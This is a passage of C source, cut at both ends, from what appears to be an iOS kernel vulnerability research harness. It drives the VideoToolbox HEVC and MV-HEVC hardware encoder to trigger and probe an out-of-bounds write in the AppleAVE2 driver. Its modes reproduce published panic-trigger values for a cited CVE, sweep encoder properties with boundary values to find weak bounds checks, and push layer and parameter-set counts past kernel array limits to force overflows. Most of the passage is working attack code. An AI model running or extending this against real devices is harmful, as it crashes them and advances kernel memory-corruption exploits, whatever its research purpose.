                CFNumberRef nbl = CFNumberCreate(NULL, kCFNumberSInt32Type, &new_baseline);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_StereoCameraBaseline, nbl);
                CFRelease(nbl);

                /* Re-prepare after property change */
                VTCompressionSessionPrepareToEncodeFrames(s);

                /* Encode and check */
                encode_one_stereo_kf(s, p + 1, w, h, 1, 1);

                if (g_last_pset_count != base_count ||
                    g_last_pset_total_bytes != base_bytes) {
                    rlog("Cycle %d prop %d: count=%zu→%zu bytes=%zu→%zu\n",
                         c, p, base_count, g_last_pset_count,
                         base_bytes, g_last_pset_total_bytes);
                    if (g_last_pset_count > base_count) {
                        anomalies++;
                        rlog("*** PSET COUNT INCREASED after property change! ***\n");
                    }
                }
            }

            VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }

        rlog("\nProperty cycle complete: %d anomalies in %d cycles\n",
             anomalies, cycles);
        if (anomalies > 0)
            rlog("*** SetSessionSettings MAY affect VPS tables! ***\n");
        else
            rlog("No property-change-induced anomalies detected.\n");

    } else if (strcmp(mode, "interleave_prepare") == 0) {
        /*
         * HYPOTHESIS: Interleaving PrepareToEncodeFrames calls BETWEEN
         * encode calls on the same session may cause additional VPS table
         * entries if the kernel PrepareToEncodeFrames path writes to the
         * table without resetting the counter.
         *
         * Test: encode, prepare N times, encode again — compare pset
         * output of second encode to a control without prepare calls.
         */
        int prepare_between = (argc > 2) ? atoi(argv[2]) : 10;
        int total_encodes = (argc > 3) ? atoi(argv[3]) : 20;
        if (prepare_between < 1) prepare_between = 10;
        if (total_encodes < 2) total_encodes = 20;

        rlog("=== INTERLEAVE_PREPARE: %d prepares between each of %d encodes ===\n",
             prepare_between, total_encodes);

        int w = 1920, h = 1080;

        /* Test session: prepare spam between encodes */
        VTCompressionSessionRef s_test = create_mvhevc_encoder(w, h, 1);
        if (!s_test) { rlog("Failed to create test session\n"); goto done; }

        rlog("\n--- Test session (with prepare spam) ---\n");
        for (int e = 0; e < total_encodes; e++) {
            /* Spam PrepareToEncodeFrames between encodes */
            if (e > 0) {
                for (int p = 0; p < prepare_between; p++)
                    VTCompressionSessionPrepareToEncodeFrames(s_test);
            }
            encode_one_stereo_kf(s_test, e, w, h, 1, 1);
            rlog("  Enc[%d]: pset_count=%zu bytes=%zu\n",
                 e, g_last_pset_count, g_last_pset_total_bytes);
        }
        VTCompressionSessionCompleteFrames(s_test, kCMTimeInvalid);
        VTCompressionSessionInvalidate(s_test);
        CFRelease(s_test);

        /* Control session: no prepare spam between encodes */
        VTCompressionSessionRef s_ctrl = create_mvhevc_encoder(w, h, 1);
        if (!s_ctrl) { rlog("Failed to create control session\n"); goto done; }

        rlog("\n--- Control session (no prepare spam) ---\n");
        for (int e = 0; e < total_encodes; e++) {
            encode_one_stereo_kf(s_ctrl, e, w, h, 1, 1);
            rlog("  Enc[%d]: pset_count=%zu bytes=%zu\n",
                 e, g_last_pset_count, g_last_pset_total_bytes);
        }
        VTCompressionSessionCompleteFrames(s_ctrl, kCMTimeInvalid);
        VTCompressionSessionInvalidate(s_ctrl);
        CFRelease(s_ctrl);

        rlog("\n=== INTERLEAVE_PREPARE complete ===\n");
        rlog("Compare test vs control outputs above.\n");
        rlog("If test shows higher pset counts, PrepareToEncodeFrames\n");
        rlog("writes to VPS tables in kernel independently of encode.\n");

    } else if (strcmp(mode, "temporal_layers") == 0) {
        /*
         * CVE-2026-112705: NumberOfTemporalLayers with out-of-range value
         * triggers kernel OOB write in AppleAVE2. Fixed in iOS 27.2.
         * iOS 27.1 SHOULD be vulnerable.
         *
         * Public PoC says value 16463 causes kernel panic.
         * We test with SAFE values first (1-8), then probe boundary.
         *
         * WARNING: Values > ~100 may kernel panic! Use with caution.
         */
        int max_layers = (argc > 2) ? atoi(argv[2]) : 8;
        int unsafe = (argc > 3 && strcmp(argv[3], "unsafe") == 0) ? 1 : 0;
        if (max_layers < 1) max_layers = 1;
        if (!unsafe && max_layers > 32) {
            rlog("Capping at 32 for safety. Pass 'unsafe' as 3rd arg to go higher.\n");
            max_layers = 32;
        }
        if (max_layers > 16463) max_layers = 16463;

        rlog("=== TEMPORAL_LAYERS: Testing values 1-%d ===\n", max_layers);
        if (unsafe) rlog("*** UNSAFE MODE — may kernel panic! ***\n");
        rlog("CVE-2026-112705: OOB write via NumberOfTemporalLayers\n\n");

        int w = 1920, h = 1080;

        for (int layers = 1; layers <= max_layers; layers++) {
            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                kCFBooleanTrue);

            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(enc_spec);

            if (st != noErr || !s) {
                rlog("layers=%d: session create FAILED (%d)\n", layers, (int)st);
                continue;
            }

            /* Set temporal layers */
            CFNumberRef nlayers = CFNumberCreate(NULL, kCFNumberIntType, &layers);
            OSStatus prop_st = VTSessionSetProperty(s,
                CFSTR("NumberOfTemporalLayers"), nlayers);
            CFRelease(nlayers);

            rlog("layers=%d: SetProperty=%d", layers, (int)prop_st);

            if (prop_st != noErr) {
                rlog(" (rejected by VT)\n");
                VTCompressionSessionInvalidate(s);
                CFRelease(s);
                continue;
            }

            /* PrepareToEncodeFrames — this may trigger the kernel-side setup */
            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog(", Prepare=%d", (int)pr);

            if (pr != noErr) {
                rlog(" (prepare failed)\n");
                VTCompressionSessionInvalidate(s);
                CFRelease(s);
                continue;
            }

            /* Encode one frame */
            int enc_st2 = encode_one(s, 0, w, h);
            rlog(", Encode=%d, pset_count=%zu, bytes=%zu\n",
                 enc_st2, g_last_pset_count, g_last_pset_total_bytes);

            VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
            VTCompressionSessionInvalidate(s);
            CFRelease(s);

            /* If we survived, the value didn't panic */
            if (layers > 8 && layers % 10 == 0) {
                rlog("  (survived layers=%d, continuing...)\n", layers);
            }
        }

        rlog("\n=== TEMPORAL_LAYERS complete ===\n");
        rlog("If panic occurred, check /var/log/panic.log for data abort.\n");
        rlog("Safe values that passed can be combined with MV-HEVC for\n");
        rlog("additional VPS table entries.\n");

    } else if (strcmp(mode, "resolution_probe") == 0) {
        /*
         * Lak453 PoC for CVE-2026-112705: H.264 at 32768x16384 with BGRA
         * causes kernel panic. Test with HEVC at various large resolutions
         * to find the boundary where bounds checks fail.
         */
        rlog("=== RESOLUTION_PROBE: Testing large encoder resolutions ===\n");
        rlog("Based on Lak453 CVE-2026-112705 reproducer.\n\n");

        int test_sizes[][2] = {
            {3840, 2160},   /* 4K — should work */
            {4096, 2160},   /* DCI 4K */
            {7680, 4320},   /* 8K */
            {8192, 4320},
            {16384, 8640},
            {32768, 16384}, /* Lak453 trigger (H.264) */
        };
        int num_tests = sizeof(test_sizes) / sizeof(test_sizes[0]);

        int safe_only = !(argc > 2 && strcmp(argv[2], "unsafe") == 0);
        if (safe_only) {
            num_tests = 4; /* skip 16K and 32K */
            rlog("Safe mode: testing up to 8192x4320. Pass 'unsafe' to test larger.\n\n");
        }

        for (int t = 0; t < num_tests; t++) {
            int tw = test_sizes[t][0], th = test_sizes[t][1];
            rlog("Testing %dx%d HEVC... ", tw, th);

            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                kCFBooleanTrue);

            OSStatus st = VTCompressionSessionCreate(NULL, tw, th,
                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(enc_spec);

            if (st != noErr || !s) {
                rlog("create FAILED (%d)\n", (int)st);
                continue;
            }

            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
            if (pr != noErr) {
                rlog("prepare FAILED (%d)\n", (int)pr);
                VTCompressionSessionInvalidate(s);
                CFRelease(s);
                continue;
            }

            /* Try to create pixel buffer at this size */
            CVPixelBufferRef pb = NULL;
            CVReturn cvr = CVPixelBufferCreate(NULL, tw, th,
                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb);

            if (cvr != kCVReturnSuccess || !pb) {
                rlog("pixelbuf FAILED (%d) — too large for device memory\n", (int)cvr);
                VTCompressionSessionInvalidate(s);
                CFRelease(s);
                continue;
            }

            /* Try encode */
            g_encode_done = 0;
            g_cb_status = -999;
            CMTime pts = CMTimeMake(0, 30);
            st = VTCompressionSessionEncodeFrame(s, pb, pts, CMTimeMake(1,30),
                NULL, NULL, NULL);
            rlog("encode=%d", (int)st);

            if (st == noErr) {
                /* Wait for callback */
                for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
                rlog(", cb=%d, pset=%zu, bytes=%zu",
                     (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);
            }
            rlog("\n");

            CVPixelBufferRelease(pb);
            VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }

        rlog("\n=== RESOLUTION_PROBE complete ===\n");

    } else if (strcmp(mode, "enum_properties") == 0) {
        /*
         * Enumerate ALL supported properties on the hardware HEVC encoder.
         * Uses VTSessionCopySupportedPropertyDictionary to discover every
         * configurable parameter. This reveals which properties reach the
         * kernel driver and could have weak bounds checking.
         */
        rlog("=== ENUM_PROPERTIES: Discovering all HEVC encoder properties ===\n\n");

        int w = 1920, h = 1080;
        VTCompressionSessionRef s = create_mvhevc_encoder(w, h, 1);
        if (!s) {
            rlog("Failed to create MV-HEVC encoder\n");

            /* Try standard HEVC as fallback */
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                kCFBooleanTrue);
            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(enc_spec);
            if (st != noErr || !s) {
                rlog("Failed to create any HEVC encoder: %d\n", (int)st);
                goto done;
            }
            rlog("Using standard HEVC encoder (no MV-HEVC)\n\n");
        }

        CFDictionaryRef props = NULL;
        OSStatus st = VTSessionCopySupportedPropertyDictionary(s, &props);
        if (st != noErr || !props) {
            rlog("VTSessionCopySupportedPropertyDictionary failed: %d\n", (int)st);
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
            goto done;
        }

        CFIndex count = CFDictionaryGetCount(props);
        rlog("Found %ld supported properties:\n\n", (long)count);

        /* Get all keys and values */
        const void **keys = malloc(sizeof(void*) * count);
        const void **vals = malloc(sizeof(void*) * count);
        CFDictionaryGetKeysAndValues(props, keys, vals);

        for (CFIndex i = 0; i < count; i++) {
            CFStringRef key = (CFStringRef)keys[i];
            CFDictionaryRef info = (CFDictionaryRef)vals[i];

            /* Get property name as C string */
            char keystr[256] = {0};
            CFStringGetCString(key, keystr, sizeof(keystr), kCFStringEncodingUTF8);

            rlog("[%ld] %s\n", (long)i, keystr);

            /* Extract property metadata if it's a dictionary */
            if (CFGetTypeID(info) == CFDictionaryGetTypeID()) {
                /* PropertyType */
                CFStringRef ptype = CFDictionaryGetValue(info, CFSTR("PropertyType"));
                if (ptype) {
                    char tstr[64] = {0};
                    CFStringGetCString(ptype, tstr, sizeof(tstr), kCFStringEncodingUTF8);
                    rlog("    Type: %s", tstr);
                }

                /* ReadWriteStatus */
                CFStringRef rw = CFDictionaryGetValue(info, CFSTR("ReadWriteStatus"));
                if (rw) {
                    char rwstr[32] = {0};
                    CFStringGetCString(rw, rwstr, sizeof(rwstr), kCFStringEncodingUTF8);
                    rlog("  RW: %s", rwstr);
                }

                /* MinimumValue / MaximumValue for numeric types */
                CFNumberRef minv = CFDictionaryGetValue(info, CFSTR("SupportedValueMinimumKey"));
                CFNumberRef maxv = CFDictionaryGetValue(info, CFSTR("SupportedValueMaximumKey"));
                if (minv) {
                    double mv = 0;
                    CFNumberGetValue(minv, kCFNumberDoubleType, &mv);
                    rlog("  Min: %.0f", mv);
                }
                if (maxv) {
                    double mv = 0;
                    CFNumberGetValue(maxv, kCFNumberDoubleType, &mv);
                    rlog("  Max: %.0f", mv);
                }

                /* SupportedValueList for enum types */
                CFArrayRef vlist = CFDictionaryGetValue(info, CFSTR("SupportedValueListKey"));
                if (vlist) {
                    CFIndex vcount = CFArrayGetCount(vlist);
                    rlog("  Values(%ld):", (long)vcount);
                    for (CFIndex v = 0; v < vcount && v < 10; v++) {
                        CFTypeRef val = CFArrayGetValueAtIndex(vlist, v);
                        if (CFGetTypeID(val) == CFStringGetTypeID()) {
                            char vstr[64] = {0};
                            CFStringGetCString(val, vstr, sizeof(vstr), kCFStringEncodingUTF8);
                            rlog(" %s", vstr);
                        } else if (CFGetTypeID(val) == CFNumberGetTypeID()) {
                            int iv = 0;
                            CFNumberGetValue(val, kCFNumberIntType, &iv);
                            rlog(" %d", iv);
                        }
                    }
                }

                rlog("\n");
            }
        }

        free(keys);
        free(vals);
        CFRelease(props);

        /* Also test some undocumented properties */
        rlog("\n--- Testing undocumented/edge-case properties ---\n");
        const char *test_props[] = {
            "NumberOfTemporalLayers",
            "ReferenceBufferCount",
            "MaxSliceBytes",
            "MaxFrameDelayCount",
            "BaseLayerBitRateFraction",
            "MinimizeMemoryUsage",
            "MaximizePowerEfficiency",
            NULL
        };

        for (int p = 0; test_props[p]; p++) {
            CFStringRef pk = CFStringCreateWithCString(NULL, test_props[p],
                kCFStringEncodingUTF8);
            CFTypeRef curval = NULL;
            OSStatus gs = VTSessionCopyProperty(s, pk, NULL, &curval);
            rlog("  %s: get=%d", test_props[p], (int)gs);
            if (gs == noErr && curval) {
                if (CFGetTypeID(curval) == CFNumberGetTypeID()) {
                    int iv = 0;
                    CFNumberGetValue(curval, kCFNumberIntType, &iv);
                    rlog(" value=%d", iv);
                }
                CFRelease(curval);
            }

            /* Try setting to boundary values */
            int test_vals[] = {0, 1, 255, 256, 1024, 65535};
            for (int t = 0; t < 6; t++) {
                CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &test_vals[t]);
                OSStatus ss = VTSessionSetProperty(s, pk, nv);
                if (ss == noErr) {
                    rlog(" set(%d)=OK", test_vals[t]);
                }
                CFRelease(nv);
            }
            rlog("\n");
            CFRelease(pk);
        }

        VTCompressionSessionInvalidate(s);
        CFRelease(s);
        rlog("\n=== ENUM_PROPERTIES complete ===\n");
        rlog("Properties accepting values > 255 without error are candidates\n");
        rlog("for kernel-side bounds check bypass (like NumberOfTemporalLayers).\n");

    } else if (strcmp(mode, "vps_overflow") == 0) {
        /*
         * vps_overflow — KEY TEST: Set MVHEVCVideoLayerIDs with >64 entries
         *
         * Session 28 breakthrough: The fix (AVE_HEVC_CheckVPSExtBounds) adds
         * bounds checks on VPS extension arrays (dim 64). If VideoToolbox
         * doesn't validate layer count, >64 layers → kernel VPS extension
         * array overflow during sAddClient.
         *
         * Tests layer counts: 32, 48, 64, 65, 72, 96, 128
         * Reports which counts succeed at each pipeline stage.
         */
        rlog("=== VPS Extension Overflow Test ===\n");
        rlog("Target: VPS extension arrays dim 64 in kernel\n");
        rlog("Goal: Set >64 MV-HEVC layer IDs → overflow during sAddClient\n\n");

        int test_layers[] = {2, 32, 48, 64, 65, 72, 96, 128};
        int n_tests = sizeof(test_layers) / sizeof(test_layers[0]);
        int w = 128, h = 128;

        for (int t = 0; t < n_tests; t++) {
            int nlayers = test_layers[t];
            rlog("--- Testing %d layers ---\n", nlayers);

            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks,
                &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                kCFBooleanTrue);
            CFDictionarySetValue(enc_spec,
                CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                kCFBooleanTrue);

            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
                encode_cb, NULL, &s);
            CFRelease(enc_spec);
            if (st != noErr || !s) {
                rlog("  VTCompressionSessionCreate FAILED: %d\n", (int)st);
                continue;
            }

            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime,
                kCFBooleanTrue);
            int kf = 1;
            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
            VTSessionSetProperty(s,
                kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
            CFRelease(kfn);
            VTSessionSetProperty(s,
                kVTCompressionPropertyKey_AllowFrameReordering,
                kCFBooleanFalse);

            /* Build layer ID array: [0, 1, ..., nlayers-1] */
            CFNumberRef *layer_nums = calloc(nlayers, sizeof(CFNumberRef));
            CFTypeRef *layer_ptrs = calloc(nlayers, sizeof(CFTypeRef));
            for (int i = 0; i < nlayers; i++) {
                layer_nums[i] = CFNumberCreate(NULL, kCFNumberIntType, &i);
                layer_ptrs[i] = layer_nums[i];
            }
            CFArrayRef layer_arr = CFArrayCreate(NULL, layer_ptrs, nlayers,
                &kCFTypeArrayCallBacks);

            OSStatus sp1 = VTSessionSetProperty(s,
                kVTCompressionPropertyKey_MVHEVCVideoLayerIDs, layer_arr);
            rlog("  MVHEVCVideoLayerIDs(%d): %d\n", nlayers, (int)sp1);

            OSStatus sp2 = VTSessionSetProperty(s,
                kVTCompressionPropertyKey_MVHEVCViewIDs, layer_arr);
            rlog("  MVHEVCViewIDs(%d): %d\n", nlayers, (int)sp2);

            /* LeftAndRightViewIDs: only use first 2 for stereo */
            if (nlayers >= 2) {
                CFArrayRef lr_arr = CFArrayCreate(NULL, layer_ptrs, 2,
                    &kCFTypeArrayCallBacks);
                OSStatus sp3 = VTSessionSetProperty(s,
                    kVTCompressionPropertyKey_MVHEVCLeftAndRightViewIDs,
                    lr_arr);
                rlog("  MVHEVCLeftAndRightViewIDs: %d\n", (int)sp3);
                CFRelease(lr_arr);
            }

            VTSessionSetProperty(s,
                kVTCompressionPropertyKey_HeroEye, CFSTR("left"));
            VTSessionSetProperty(s,
                kVTCompressionPropertyKey_HasLeftStereoEyeView,
                kCFBooleanTrue);
            VTSessionSetProperty(s,
                kVTCompressionPropertyKey_HasRightStereoEyeView,
                kCFBooleanTrue);
            VTSessionSetProperty(s,
                kVTCompressionPropertyKey_ProfileLevel,
                kVTProfileLevel_HEVC_Main10_AutoLevel);

            CFRelease(layer_arr);
            for (int i = 0; i < nlayers; i++) CFRelease(layer_nums[i]);
            free(layer_nums);
            free(layer_ptrs);

            /* Try PrepareToEncodeFrames — this triggers sAddClient in kernel */
            st = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("  PrepareToEncodeFrames: %d\n", (int)st);

            if (st == noErr) {
                /* Try a single encode */
                g_encode_done = 0;
                g_cb_status = -999;
                g_last_pset_count = 0;
                g_last_pset_total_bytes = 0;

                /* Create stereo buffer pair */
                CVPixelBufferRef pb0 = create_yuv_pb_stereo(w, h, 0x40);
                CVPixelBufferRef pb1 = create_yuv_pb_stereo(w, h, 0x60);

                if (pb0 && pb1 && VTCompressionSessionEncodeMultiImageFrame) {
                    CMTag t0[2] = { kCMTagStereoLeftEye,
                        CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 0) };
                    CMTag t1[2] = { kCMTagStereoRightEye,
                        CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 1) };

                    CMTagCollectionRef tc0 = NULL, tc1 = NULL;
                    CMTagCollectionCreate(NULL, t0, 2, &tc0);
                    CMTagCollectionCreate(NULL, t1, 2, &tc1);

                    CFMutableArrayRef tcArr = CFArrayCreateMutable(NULL, 2,
                        &kCFTypeArrayCallBacks);
                    CFMutableArrayRef bArr = CFArrayCreateMutable(NULL, 2,
                        &kCFTypeArrayCallBacks);
                    CFArrayAppendValue(tcArr, tc0);
                    CFArrayAppendValue(tcArr, tc1);
                    CFArrayAppendValue(bArr, pb0);
                    CFArrayAppendValue(bArr, pb1);

                    CMTaggedBufferGroupRef grp = NULL;
                    CMTaggedBufferGroupCreate(NULL, tcArr, bArr, &grp);
                    CFRelease(tcArr); CFRelease(bArr);
                    CFRelease(tc0); CFRelease(tc1);

                    if (grp) {
                        CMTime pts = CMTimeMake(0, 30);
                        CMTime dur = CMTimeMake(1, 30);
                        CFMutableDictionaryRef fp = CFDictionaryCreateMutable(
                            NULL, 0, &kCFTypeDictionaryKeyCallBacks,
                            &kCFTypeDictionaryValueCallBacks);
                        CFDictionarySetValue(fp,
                            kVTEncodeFrameOptionKey_ForceKeyFrame,
                            kCFBooleanTrue);

                        st = VTCompressionSessionEncodeMultiImageFrame(
                            s, grp, pts, dur, fp, NULL, NULL);
                        rlog("  EncodeMultiImageFrame: %d\n", (int)st);
                        CFRelease(fp);
                        CFRelease(grp);

                        for (int ww = 0; ww < 500 && !g_encode_done; ww++)
                            usleep(10000);
                        rlog("  Callback: status=%d psets=%zu bytes=%zu\n",
                            (int)g_cb_status, g_last_pset_count,
                            g_last_pset_total_bytes);
                    }
                } else if (pb0) {
                    /* Fallback: standard single-image encode */
                    encode_one(s, 0, w, h);
                    for (int ww = 0; ww < 500 && !g_encode_done; ww++)
                        usleep(10000);
                    rlog("  Encode: status=%d psets=%zu bytes=%zu\n",
                        (int)g_cb_status, g_last_pset_count,
                        g_last_pset_total_bytes);
                }
                if (pb0) CVPixelBufferRelease(pb0);
                if (pb1) CVPixelBufferRelease(pb1);
            }

            VTCompressionSessionInvalidate(s);
            CFRelease(s);

            rlog("  RESULT: %s\n\n",
                (sp1 == noErr && st == noErr) ? "PASSED through pipeline" :
                (sp1 != noErr) ? "REJECTED at VTSessionSetProperty" :
                "REJECTED at PrepareToEncodeFrames");
        }

        rlog("If any test with >64 layers passed through PrepareToEncodeFrames,\n");
        rlog("the kernel VPS extension arrays may have overflowed.\n");
        rlog("Check dmesg/syslog for kernel panics or assertions.\n");

    } else if (strcmp(mode, "multi_layer") == 0) {
        /*
         * multi_layer — Create MV-HEVC encoder with N layers (not just 2)
         * and measure pset output. If N layers → N+2 pset entries per encode,
         * then 63 layers = 65 entries/encode → only 4 encodes to reach 256.
         *
         * Usage: multi_layer [max_layers]
         *   max_layers: test up to this many layers (default 63)
         */
        int max_layers = (argc > 2) ? atoi(argv[2]) : 63;
        if (max_layers < 3) max_layers = 3;
        if (max_layers > 63) max_layers = 63;
        int test_counts[] = {3, 5, 8, 10, 16, 20, 32, 48, 63};
        int n_tests = sizeof(test_counts) / sizeof(test_counts[0]);

        rlog("=== MULTI-LAYER MV-HEVC PROBE ===\n");
        rlog("Testing layer counts up to %d\n\n", max_layers);

        int w = 192, h = 144;

        for (int t = 0; t < n_tests; t++) {
            int nlayers = test_counts[t];
            if (nlayers > max_layers) break;

            rlog("--- %d layers ---\n", nlayers);

            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                                 kCFBooleanTrue);
            CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                                 kCFBooleanTrue);

            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
                encode_cb, NULL, &s);
            CFRelease(enc_spec);
            if (st != noErr || !s) {
                rlog("  Create encoder FAILED: %d\n", (int)st);
                continue;
            }

            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            int kf = 1;
            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
            CFRelease(kfn);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

            /* Build layer ID array: [0, 1, 2, ..., nlayers-1] */
            CFNumberRef layer_nums[64];
            CFTypeRef layer_ptrs[64];
            for (int i = 0; i < nlayers; i++) {
                layer_nums[i] = CFNumberCreate(NULL, kCFNumberIntType, &i);
                layer_ptrs[i] = layer_nums[i];
            }
            CFArrayRef layer_arr = CFArrayCreate(NULL, layer_ptrs, nlayers, &kCFTypeArrayCallBacks);

            OSStatus sp1 = VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCVideoLayerIDs, layer_arr);
            rlog("  MVHEVCVideoLayerIDs(%d): %d\n", nlayers, (int)sp1);

            OSStatus sp2 = VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCViewIDs, layer_arr);
            rlog("  MVHEVCViewIDs: %d\n", (int)sp2);

            /* LeftAndRightViewIDs: only use first 2 for stereo eye mapping */
            CFArrayRef lr_arr = CFArrayCreate(NULL, layer_ptrs, 2, &kCFTypeArrayCallBacks);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCLeftAndRightViewIDs, lr_arr);
            CFRelease(lr_arr);

            VTSessionSetProperty(s, kVTCompressionPropertyKey_HeroEye, CFSTR("left"));
            VTSessionSetProperty(s, kVTCompressionPropertyKey_HasLeftStereoEyeView, kCFBooleanTrue);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_HasRightStereoEyeView, kCFBooleanTrue);
            uint32_t baseline = 64000;
            CFNumberRef bl = CFNumberCreate(NULL, kCFNumberSInt32Type, &baseline);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_StereoCameraBaseline, bl);
            CFRelease(bl);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_ProfileLevel,
                kVTProfileLevel_HEVC_Main10_AutoLevel);

            CFRelease(layer_arr);
            for (int i = 0; i < nlayers; i++) CFRelease(layer_nums[i]);

            st = VTCompressionSessionPrepareToEncodeFrames(s);
            if (st != noErr) {
                rlog("  PrepareToEncodeFrames FAILED: %d\n", (int)st);
                VTCompressionSessionInvalidate(s);
                CFRelease(s);
                continue;
            }

            /* Encode using CMTaggedBufferGroup with nlayers tagged buffers */
            if (VTCompressionSessionEncodeMultiImageFrame) {
                CVPixelBufferRef pbs[64];
                int pb_ok = 1;
                for (int i = 0; i < nlayers; i++) {
                    pbs[i] = create_yuv_pb_stereo(w, h, (uint8_t)(0x20 + i * 3));
                    if (!pbs[i]) { pb_ok = 0; break; }
                }
                if (!pb_ok) {
                    rlog("  Failed to create pixel buffers\n");
                    for (int i = 0; i < nlayers; i++) if (pbs[i]) CVPixelBufferRelease(pbs[i]);
                    VTCompressionSessionInvalidate(s);
                    CFRelease(s);
                    continue;
                }

                /* Build tagged buffer group */
                CMTaggedBufferGroupRef group = NULL;
                CMTag tags_arr[64];
                for (int i = 0; i < nlayers; i++) {
                    tags_arr[i] = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, i);
                }

                /* Use iterative approach: add buffers one at a time */
                /* First create with buffer 0 */
                CMTag first_tags[2] = { kCMTagStereoLeftEye, tags_arr[0] };
                CMTagCollectionRef tc0 = NULL;
                CMTagCollectionCreate(NULL, first_tags, 2, &tc0);

                CMTaggedBufferGroupRef grp = NULL;
                {
                    CFMutableArrayRef tcArr = CFArrayCreateMutable(NULL, 1, &kCFTypeArrayCallBacks);
                    CFMutableArrayRef bArr = CFArrayCreateMutable(NULL, 1, &kCFTypeArrayCallBacks);
                    CFArrayAppendValue(tcArr, tc0);
                    CFArrayAppendValue(bArr, pbs[0]);
                    OSStatus gs0 = CMTaggedBufferGroupCreate(NULL, tcArr, bArr, &grp);
                    CFRelease(tcArr); CFRelease(bArr); CFRelease(tc0);
                    (void)gs0;
                }
                OSStatus gs = grp ? noErr : -1;

                if (gs != noErr || !grp) {
                    rlog("  CMTaggedBufferGroupCreateCombined FAILED: %d\n", (int)gs);
                    for (int i = 0; i < nlayers; i++) CVPixelBufferRelease(pbs[i]);
                    VTCompressionSessionInvalidate(s);
                    CFRelease(s);
                    continue;
                }

                /* For layers 1+, we need to add them. With only 2 layers
                 * we have stereo left+right. For >2 we do multi-view.
                 * Since CMTaggedBufferGroupCreateCombined takes arrays,
                 * rebuild with all layers at once. */
                CFRelease(grp); grp = NULL;

                CMTagCollectionRef tcs[64];
                CMBufferRef bufs[64];
                for (int i = 0; i < nlayers; i++) {
                    CMTag t[2];
                    int ntags;
                    if (i == 0) {
                        t[0] = kCMTagStereoLeftEye;
                        t[1] = tags_arr[i];
                        ntags = 2;
                    } else if (i == 1) {
                        t[0] = kCMTagStereoRightEye;
                        t[1] = tags_arr[i];
                        ntags = 2;
                    } else {
                        t[0] = tags_arr[i];
                        ntags = 1;
                    }
                    CMTagCollectionCreate(NULL, t, ntags, &tcs[i]);
                    bufs[i] = (CMBufferRef)pbs[i];
                }

                {
                    CFMutableArrayRef tcArr = CFArrayCreateMutable(NULL, nlayers, &kCFTypeArrayCallBacks);
                    CFMutableArrayRef bArr = CFArrayCreateMutable(NULL, nlayers, &kCFTypeArrayCallBacks);
                    for (int i = 0; i < nlayers; i++) {
                        CFArrayAppendValue(tcArr, tcs[i]);
